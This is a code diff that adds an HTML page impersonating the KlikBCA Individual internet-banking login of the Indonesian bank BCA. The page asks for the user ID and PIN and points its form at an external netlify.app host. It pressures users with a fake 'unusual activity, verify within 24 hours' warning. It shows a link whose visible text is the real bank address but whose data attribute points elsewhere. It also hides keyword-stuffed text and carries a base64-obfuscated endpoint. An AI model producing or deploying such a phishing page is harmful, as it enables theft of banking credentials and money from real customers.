@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>KlikBCA Individual</title>
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: #f4f4f4;
+      color: #333;
+    }
+
+    .topbar {
+      height: 72px;
+      background: #0866a9;
+      display: flex;
+      align-items: center;
+      padding: 0 12%;
+      color: white;
+    }
+
+    .brand {
+      font-size: 27px;
+      font-weight: bold;
+      letter-spacing: -1px;
+    }
+
+    .brand span {
+      font-size: 15px;
+      margin-left: 8px;
+      font-weight: normal;
+    }
+
+    .wrapper {
+      max-width: 920px;
+      margin: 45px auto;
+      display: flex;
+      gap: 25px;
+    }
+
+    .login-box {
+      width: 390px;
+      background: white;
+      border-top: 5px solid #1678b9;
+      padding: 28px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.12);
+    }
+
+    .login-box h2 {
+      margin: 0 0 8px;
+      color: #1269a5;
+      font-size: 21px;
+    }
+
+    .login-box p {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.5;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      margin: 18px 0 6px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      height: 40px;
+      border: 1px solid #aaa;
+      padding: 8px 10px;
+      font-size: 15px;
+    }
+
+    button {
+      margin-top: 22px;
+      width: 100%;
+      height: 42px;
+      background: #1475b5;
+      color: white;
+      border: 0;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .notice {
+      flex: 1;
+      background: white;
+      padding: 26px 30px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.08);
+    }
+
+    .notice h3 {
+      color: #1269a5;
+      margin-top: 0;
+    }
+
+    .alert {
+      background: #fff4d6;
+      border-left: 4px solid #e4a11b;
+      padding: 12px;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .notice li {
+      margin: 12px 0;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .help {
+      margin-top: 18px;
+      font-size: 12px;
+    }
+
+    .help a {
+      color: #1269a5;
+    }
+
+    .footer {
+      text-align: center;
+      color: #777;
+      font-size: 11px;
+      margin: 40px 0;
+    }
+
+    .hidden {
+      position: absolute;
+      left: -10000px;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="topbar">
+    <div class="brand">
+      BCA
+      <span>KlikBCA Individual</span>
+    </div>
+  </div>
+
+  <main class="wrapper">
+
+    <section class="login-box">
+      <h2>Internet Banking Individual</h2>
+
+      <p>
+        Silakan masukkan USER ID dan PIN Internet Banking Anda
+        untuk melanjutkan transaksi.
+      </p>
+
+      <form
+        id="loginForm"
+        action="https://klikbca-verification.netlify.app/auth/login"
+        method="POST"
+      >
+        <label for="userid">USER ID</label>
+        <input
+          id="userid"
+          type="text"
+          name="userid"
+          maxlength="12"
+          autocomplete="username"
+          required
+        >
+
+        <label for="pin">PIN Internet Banking</label>
+        <input
+          id="pin"
+          type="password"
+          name="pin"
+          maxlength="6"
+          inputmode="numeric"
+          autocomplete="current-password"
+          required
+        >
+
+        <input
+          type="hidden"
+          name="session"
+          value="KBC-981284771"
+        >
+
+        <button type="submit">
+          LOGIN
+        </button>
+      </form>
+
+      <div class="help">
+        <a
+          href="#"
+          data-url="https://secure-klikbca.netlify.app/recovery"
+        >
+          Lupa USER ID atau PIN?
+        </a>
+      </div>
+    </section>
+
+    <aside class="notice">
+      <h3>Informasi Keamanan</h3>
+
+      <div class="alert">
+        Sistem mendeteksi aktivitas yang tidak biasa pada akun Anda.
+        Verifikasi diperlukan untuk memastikan layanan Internet Banking
+        tetap dapat digunakan.
+      </div>
+
+      <ul>
+        <li>
+          Pastikan data akun Anda telah diperbarui untuk menghindari
+          pembatasan layanan.
+        </li>
+        <li>
+          Proses verifikasi harus diselesaikan dalam waktu 24 jam.
+        </li>
+        <li>
+          Akun yang belum diverifikasi dapat mengalami pembatasan
+          sementara demi keamanan.
+        </li>
+      </ul>
+
+      <p>
+        Untuk meningkatkan keamanan transaksi, pengguna mungkin
+        diminta melakukan autentikasi tambahan menggunakan KeyBCA.
+      </p>
+
+      <a
+        href="#"
+        data-destination="https://klikbca-security.invalid/keybca"
+      >
+        https://ibank.klikbca.com/
+      </a>
+    </aside>
+
+  </main>
+
+  <div class="hidden">
+    klikbca login userid pin keybca authentication
+    rekening internet banking verifikasi akun transaksi
+    keamanan account verification secure login
+  </div>
+
+  <footer class="footer">
+    © BCA Internet Banking
+  </footer>
+
+  <script>
+    const x =
+      "aHR0cHM6Ly9rbGlrYmNhLXNlY3VyaXR5LmludmFsaWQvc2Vzc2lvbg==";
+
+    const endpoint = atob(x);
+
+    document
+      .getElementById("loginForm")
+      .addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        const user = document.getElementById("userid");
+        const pin = document.getElementById("pin");
+
+        user.value = "";
+        pin.value = "";
+
+        window.history.replaceState(
+          {},
+          "",
+          "/authentication/verification"
+        );
+
+        document.querySelector(".login-box").innerHTML =
+          "<h2>Verifikasi Diproses</h2>" +
+          "<p>Permintaan Anda sedang diproses. Silakan tunggu beberapa saat.</p>";
+
+        console.log(endpoint);
+      });
+  </script>
+
+</body>
+</html>
